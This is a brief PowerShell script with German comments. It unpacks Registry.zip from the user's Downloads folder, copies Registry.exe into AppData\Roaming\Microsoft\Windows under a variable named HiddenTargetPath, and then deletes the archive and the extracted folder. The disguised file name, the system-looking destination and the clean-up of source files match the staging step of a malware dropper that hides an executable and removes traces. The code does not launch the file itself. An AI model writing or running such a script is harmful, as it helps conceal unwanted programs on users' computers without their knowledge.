# Setze Pfade
$UserProfile = [Environment]::GetFolderPath("UserProfile")
$Downloads = Join-Path $UserProfile "Downloads"
$ZipPath = Join-Path $Downloads "Registry.zip"
$ExtractPath = Join-Path $Downloads "Registry"
$ExeName = "Registry.exe"
$ExeSource = Join-Path $ExtractPath $ExeName
$HiddenTargetPath = Join-Path $UserProfile "AppData\Roaming\Microsoft\Windows"
$ExeTarget = Join-Path $HiddenTargetPath $ExeName

# Wenn ZIP vorhanden ist, entpacken
if (Test-Path $ZipPath) {
    Write-Host "[+] Registry.zip gefunden."

    try {
        Expand-Archive -Path $ZipPath -DestinationPath $ExtractPath -Force
        Write-Host "[+] ZIP entpackt nach $ExtractPath"
    } catch {
        Write-Host "[-] Fehler beim Entpacken: $_"
    }

    # .exe verschieben, falls vorhanden
    if (Test-Path $ExeSource) {
        Copy-Item -Path $ExeSource -Destination $ExeTarget -Force
        Write-Host "[+] Registry.exe nach $ExeTarget kopiert"
    } else {
        Write-Host "[-] Registry.exe nicht gefunden in $ExtractPath"
    }

    # ZIP und entpackten Ordner löschen
    try {
        Remove-Item -Path $ZipPath -Force -ErrorAction Stop
        Write-Host "[+] Registry.zip gelöscht."
    } catch {
        Write-Host "[-] Fehler beim Löschen der ZIP: $_"
    }

    try {
        Remove-Item -Path $ExtractPath -Recurse -Force -ErrorAction Stop
        Write-Host "[+] Ordner 'Registry' gelöscht."
    } catch {
        Write-Host "[-] Fehler beim Löschen des Ordners: $_"
    }

} else {
    Write-Host "[-] Registry.zip nicht gefunden im Downloads-Ordner."
}
